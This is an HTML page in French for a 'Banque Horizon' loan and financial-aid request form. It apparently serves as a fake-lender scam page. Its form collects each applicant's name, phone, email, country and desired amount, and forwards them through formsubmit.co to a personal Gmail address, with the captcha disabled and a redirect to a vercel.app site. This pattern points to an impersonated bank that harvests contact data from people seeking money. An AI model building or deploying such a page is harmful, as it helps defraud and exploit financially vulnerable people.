<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Demande de prêt – Banque Horizon</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background:#f8f9fa; padding-top:90px; }
    .card { max-width:800px; margin:0 auto; }
  </style>
</head>
<body>

<nav class="navbar navbar-light bg-white shadow fixed-top">
  <div class="container">
    <a class="navbar-brand fw-bold text-primary" href="index.html">
      <img src="img/logo.png" width="40" alt=""> Banque Horizon
    </a>
  </div>
</nav>

<div class="container py-5">
  <div class="card shadow">
    <div class="card-body p-5">
      <h2 class="text-center mb-4">Demande de prêt / Assistance / Aide financière</h2>
      <form action="https://formsubmit.co/janlupa727@gmail.com" method="POST">
        <div class="row g-3">
          <div class="col-md-6"><input type="text" name="Nom" class="form-control" placeholder="Nom complet" required></div>
          <div class="col-md-6"><input type="tel" name="Téléphone" class="form-control" placeholder="Téléphone" required></div>
          <div class="col-12"><input type="email" name="Email" class="form-control" placeholder="Email" required></div>

          <div class="col-md-6">
            <select name="Pays" class="form-select" required>
              <option value="">Choisissez votre pays</option>
              <option>France</option><option>Belgique</option><option>Suisse</option><option>Espagne</option>
              <option>Italie</option><option>Portugal</option><option>Luxembourg</option><option>Allemagne</option>
              <option>Pays-Bas</option><option>Autriche</option><option>Irlande</option><option>Royaume-Uni</option>
              <option>Canada</option><option>Maroc</option><option>Algérie</option><option>Tunisie</option>
              <option>Sénégal</option><option>Côte d'Ivoire</option><option>Cameroun</option><option>Autre</option>
            </select>
          </div>

          <div class="col-md-6"><input type="number" name="Montant" class="form-control" placeholder="Montant souhaité (€)" required></div>

          <div class="col-12">
            <textarea name="Message" rows="5" class="form-control" placeholder="Décrivez votre projet ou votre besoin (prêt personnel, travaux, rachat de crédit, aide financière, conseil…)" required></textarea>
          </div>

          <div class="col-12">
            <button type="submit" class="btn btn-primary btn-lg w-100">Envoyer ma demande</button>
          </div>
        </div>

        <!-- Options FormSubmit (important) -->
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://horizon-banque-finance.vercel.app/merci.html">
        <input type="hidden" name="_subject" value="Nouvelle demande – Banque Horizon">
      </form>
    </div>
  </div>
</div>

</body>

</html>
